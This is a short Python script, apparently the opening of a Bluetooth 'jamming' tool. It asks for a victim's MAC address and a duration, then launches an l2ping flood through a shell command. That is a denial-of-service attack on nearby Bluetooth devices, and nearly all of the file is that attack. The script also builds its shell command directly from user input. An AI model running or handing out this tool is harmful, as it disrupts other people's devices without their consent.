import os
import subprocess
import time
import colorama
from colorama import Fore, Back, Style
import headers
import random
colorama.init(autoreset=True)
def start():
    headers.header()

start()

def standart():
    mac = input("MAC of victim: ")
    time = input("Time of jamming: ")

    xterm_1 = "timeout %ss l2ping -i hci0 -s 600 -f %s &" % (time, mac)
    print("Start jamming...")

    subprocess.Popen(xterm_1, stdout=subprocess.PIPE , stderr=subprocess.PIPE,shell=True)




